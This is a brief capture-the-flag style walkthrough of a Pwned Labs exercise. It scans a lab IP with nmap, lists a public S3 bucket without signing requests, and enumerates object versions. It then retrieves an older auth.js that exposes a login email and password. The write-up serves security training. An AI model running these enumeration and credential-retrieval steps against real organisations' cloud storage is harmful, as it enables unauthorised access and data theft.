https://pwnedlabs.io/labs/hunt-for-secrets-in-git-repos

Enumerate the s3 bucket with provided IP:

```bash
nmap -Pn 16.171.123.169
	80/http
```

Web page inspection reveals bucket: `https://huge-logistics-dashboard.s3.eu-north-1.amazonaws.com`.
Enumerate the files in the bucket `huge-logistics-dashboard`

```bash
aws s3 ls huge-logistics-dashboard --no-sign-request
                           PRE private/
                           PRE static/
aws s3 ls s3://huge-logistics-dashboard --no-sign-request --recursive
	# Inspect these files for possible cleartext creds
```

Enumerate the bucket for `x-amz-version-id`:

```bash
curl -I https://huge-logistics-dashboard.s3.eu-north-1.amazonaws.com/static/js/auth.js
	x-amz-version-id: abcdefg0123456789.abcdefg
aws s3api get-bucket-versioning --bucket huge-logistics-dashboard                          # Doesn't work
aws s3api get-bucket-versioning --bucket huge-logistics-dashboard --no-sign-request                    # Doesn't work
aws s3api list-object-versions --bucket huge-logistics-dashboard --query "Versions[?VersionId!='null']" --no-sign-request
		x-amz-version-id: abcdefg0123456789.abcdefg
```

In addition to confirming the `x-amz-veriond-id` for `auth-id`, we also can see the info for a confidential `.xlsx`. AND, we see another `auth.js` with a different version id. Try to get the objects with the version id:

```bash
aws s3api get-object --bucket huge-logistics-dashboard --key "private/Business Health - Board Meeting (Confidential).xlsx" --version-id "XXXXXXXXXXXXXXXXXXXXXXX" test.xlsx --no-sign-request                            # Failed
aws s3api get-object --bucket huge-logistics-dashboard --key "static/js/auth.js" --version-id "XXXXXXXXXXXXXXXXXXXXXXX" auth_previous.js --no-sign-request                               # Success
	email
	password
```

Now we can login to the dashboard!
